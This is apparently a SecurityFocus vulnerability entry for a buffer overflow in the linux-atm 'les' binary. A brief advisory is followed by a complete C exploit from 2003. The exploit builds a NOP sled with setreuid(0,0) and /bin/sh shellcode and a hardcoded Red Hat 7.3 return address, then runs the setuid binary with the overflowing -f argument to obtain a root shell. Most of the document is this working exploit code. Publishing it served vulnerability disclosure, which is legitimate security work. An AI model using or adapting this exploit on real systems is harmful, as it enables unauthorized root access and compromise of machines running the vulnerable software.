source: http://www.securityfocus.com/bid/7437/info

The linux-atm 'les' executable has been reported prone to a buffer overflow vulnerability.

This issue is due to a lack of sufficient bounds checking performed on data supplied via specific command line arguments to the 'les' executable. Excessive data may overrun the bounds of an internal memory buffer and corrupt adjacent memory. As a direct result of this issue arbitrary code execution is possible.

Although this vulnerability reportedly affects linux-atm 2.4.0, previous versions may also be affected. 

/*
***             Exploit against the linux-atm project
***
***           http://sourceforge.net/projects/linux-atm
***************************************************************
***                     VULNERABILITY
***
*** Stack Overflow discovered by Angelo Rosiello
*** /usr/local/sbin/les -f `perl -e 'print "A"x252'`
*** Program received signal SIGSEGV, Segmentation fault.
*** 0x41414141 in ?? ()
****************************************************************
*** AUTHOR:     Angelo Rosiello
*** CONTACT:    angelo@dtors.net, rosiello.angelo@virgilio.it
***		guilecool@usa.com
***
*** Copyright (c) 2003 DTORS Security
*** All rights reserved.
*** http://dtors.net
***
*** SHELLCODE by esDee
***
*** 18/02/2003
***
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define NOP 0x90           // No operation instruction
#define LEN 252            // Our buffer size

void usage();

static char shellcode[] =

        // setreuid(0,0);
        "\x31\xc0"                      // xor    %eax,%eax
        "\x31\xdb"                      // xor    %ebx,%ebx
        "\x31\xc9"                      // xor    %ecx,%ecx
        "\xb0\x46"                      // mov    $0x46,%al
        "\xcd\x80"                      // int    $0x80

        // execve /bin/sh
        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x8d\x54\x24\x08"              // lea    0x8(%esp,1),%edx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit();
        "\x31\xc0"                      // xor    %eax,%eax
        "\xb0\x01"                      // mov    $0x1,%al
        "\xcd\x80";                     // int    $0x80

struct
{
  int number;
  char *version;
  long ret;
  char path[256];
}       target[] =
{
  {1," Red Hat Linux release 7.3 (Valhalla)", 0xbffff860, "/usr/local/sbin/les"},
  {2," No defined", 0xffffffff , "/usr/local/sbin/les"},
};

main(int argc, char *argv[])
{
        char buffer[LEN];
        int i;
        long ret;
        char *PATH;
        int selection;
        if(argc == 1)
        {
                usage((char **)argv[0]);
                exit(1);
        }
        selection = atoi(argv[2]);

        printf("Ret = 0x%lx and PATH= %s\n", target[selection-1].ret, (char **)target[selection-1].path);
        printf("\nCopyright (c) 2003 DTORS Security\n");
        printf("ANGELO ROSIELLO 18/02/2003\n");
        printf("\tLES-EXPLOIT for Linux x86\n\n");

        ret = target[selection-1].ret;
        PATH = target[selection-1].path;
        // Build the overflow string.
        for (i = 0; i < LEN; i += 4)  *(long *) &buffer[i] = ret;

        // copy NOP
        for (i=0; i<(LEN-strlen(shellcode)-25);i++) *(buffer+i) = NOP;

        // Copy the shellcode into the buffer.
        memcpy(buffer+i,shellcode,strlen(shellcode));

        // Execute the program
        execl(PATH, "les", "-f", buffer, NULL);
}

void usage(char *argv[])
{
        int i = 0;
        printf("\nUsage:\n%s -t [target number]\n\nTargets\n",*(char **)&argv);
        while(target[i].number)
        {
                printf("[%d]  %s \n", target[i].number, target[i].version);
                i++;
        }
}


